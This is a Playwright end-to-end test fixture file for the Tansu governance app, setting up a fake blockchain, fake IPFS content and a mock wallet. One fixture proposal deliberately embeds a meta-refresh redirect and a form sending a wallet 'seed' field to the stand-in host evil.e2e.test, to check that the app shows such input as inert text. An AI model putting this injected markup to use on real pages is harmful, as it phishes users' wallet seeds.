import { test as base, expect } from "@playwright/test";
import { Keypair } from "@stellar/stellar-sdk";
import { Badge, type Proposal } from "../../packages/tansu/src/index.ts";
import { FakeChain, projectKey } from "./chain";
import { FakeWeb, type WebContent } from "./web";
import { mockWallet } from "./wallet";

const DEMO_CID = "bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi";
export const DEAD_CID = `bafybei${"d".repeat(52)}`;
const PROPOSAL_CID = `bafybei${"p".repeat(52)}`;
const PROFILE_CID = `bafybei${"m".repeat(52)}`;
const COMMIT = "6663520bd9e6ede248fef8157b2af0b6b6b41046";
/** A member without badges, for maintainers to give some. */
export const GRACE = Keypair.fromRawEd25519Seed(
  Buffer.alloc(32, 7),
).publicKey();

const now = () => BigInt(Math.floor(Date.now() / 1000));

function proposal(
  id: number,
  title: string,
  proposer: string,
  endsIn: number,
  votes: Proposal["vote_data"]["votes"] = [],
): Proposal {
  return {
    id,
    title,
    ipfs: PROPOSAL_CID,
    proposer,
    status: { tag: "Active", values: undefined },
    outcome_contracts: undefined,
    vote_data: {
      public_voting: true,
      token_contract: undefined,
      voting_ends_at: now() + BigInt(endsIn),
      votes,
    },
  };
}

/**
 * The world the flows run in: "demo", maintained by the test wallet, with an
 * open proposal and one whose vote has ended; "ghost", whose metadata CID no
 * node provides any more. The wallet is a member unless `member` is false.
 */
function world(maintainer: string, member = true) {
  const chain = new FakeChain(
    [
      {
        project: {
          name: "demo",
          maintainers: [maintainer],
          config: { url: "https://github.com/demo/demo", ipfs: DEMO_CID },
          sub_projects: undefined,
        },
        badges: { developer: [maintainer] },
        commit: COMMIT,
        proposals: [
          proposal(0, "Adopt a code of conduct", maintainer, 7 * 86_400),
          proposal(1, "Ship the dark theme", maintainer, -3_600, [
            {
              tag: "PublicVote",
              values: [
                {
                  address: maintainer,
                  vote_choice: { tag: "Approve", values: undefined },
                  weight: Badge.Developer,
                },
              ],
            },
          ]),
        ],
      },
      {
        project: {
          name: "ghost",
          maintainers: [maintainer],
          config: { url: "https://github.com/ghost/ghost", ipfs: DEAD_CID },
          sub_projects: undefined,
        },
      },
    ],
    {
      [GRACE]: {
        meta: PROFILE_CID,
        git_identity: undefined,
        git_pubkey: undefined,
        projects: [],
      },
      ...(member && {
        [maintainer]: {
          meta: PROFILE_CID,
          git_identity: undefined,
          git_pubkey: undefined,
          projects: [
            { project: projectKey("demo"), badges: [Badge.Developer] },
          ],
        },
      }),
    },
  );
  const web: WebContent = {
    ipfs: {
      [`${DEMO_CID}/tansu.toml`]: [
        'VERSION = "2.0.0"',
        `ACCOUNTS = ["${maintainer}"]`,
        "",
        "[DOCUMENTATION]",
        'ORG_NAME = "Demo Foundation"',
        'ORG_URL = "https://demo.example"',
        'ORG_DESCRIPTION = "A project to try Tansu with."',
        'ORG_GITHUB = "demo/demo"',
        "",
        "[[PRINCIPALS]]",
        'github = "demo-dev"',
      ].join("\n"),
      // With what a proposer could slip in: only its formatting shows.
      [`${PROPOSAL_CID}/proposal.md`]: [
        "We adopt the Contributor Covenant.",
        '<meta http-equiv="refresh" content="0;url=https://evil.e2e.test/">',
        '<form action="https://evil.e2e.test/"><input name="seed"></form>',
        "```\nif (a < b && c) {}\n```",
      ].join("\n\n"),
      [`${PROPOSAL_CID}/outcomes.json`]: JSON.stringify({
        outcomes: {
          approved: { description: "Merge the code of conduct." },
          rejected: { description: "Keep the current rules." },
          cancelled: { description: "Discuss it again later." },
        },
      }),
      [`${PROFILE_CID}/profile.json`]: JSON.stringify({
        name: "Demo Maintainer",
        description: "Keeps demo running.",
      }),
    },
    deadCids: [DEAD_CID],
    github: {
      "demo/demo": {
        readme: "# Demo\n\nThe README of the demo project.",
        commits: [
          {
            sha: COMMIT,
            message: "Add the first feature",
            author: "demo-dev",
            date: "2026-09-01T10:00:00Z",
          },
          {
            sha: "a".repeat(40),
            message: "Initial commit",
            author: "demo-dev",
            date: "2026-08-01T10:00:00Z",
          },
        ],
      },
    },
  };
  return { chain, web };
}

type Fixtures = {
  /** Start with the Terms of Service already accepted. */
  acceptTerms: boolean;
  /** The wallet is already a member. */
  member: boolean;
  wallet: Keypair;
  world: ReturnType<typeof world>;
  chain: FakeChain;
  web: FakeWeb;
};

/**
 * Every test runs the production build against `world()`: a fake chain,
 * a fake web and a GHOSTSIG wallet that signs with `wallet`. A test fails on
 * any uncaught page error or any call the fakes cannot answer.
 */
export const test = base.extend<Fixtures>({
  acceptTerms: [true, { option: true }],
  member: [true, { option: true }],
  wallet: async ({}, use) => use(Keypair.random()),
  world: async ({ wallet, member }, use) =>
    use(world(wallet.publicKey(), member)),
  chain: async ({ context, world }, use) => {
    await world.chain.route(context);
    await use(world.chain);
    expect(world.chain.unexpected).toEqual([]);
  },
  web: async ({ context, world }, use) => {
    const web = new FakeWeb(world.web);
    await web.route(context);
    await use(web);
  },
  page: async ({ page, chain, web, wallet, acceptTerms }, use) => {
    void chain;
    void web;
    await mockWallet(page.context(), wallet);
    if (acceptTerms) {
      await page.addInitScript(() =>
        localStorage.setItem("tansu_tos_accepted", "true"),
      );
    }
    const errors: string[] = [];
    page.on("pageerror", (error) => errors.push(error.message));
    await use(page);
    expect(errors).toEqual([]);
  },
});

export { expect };
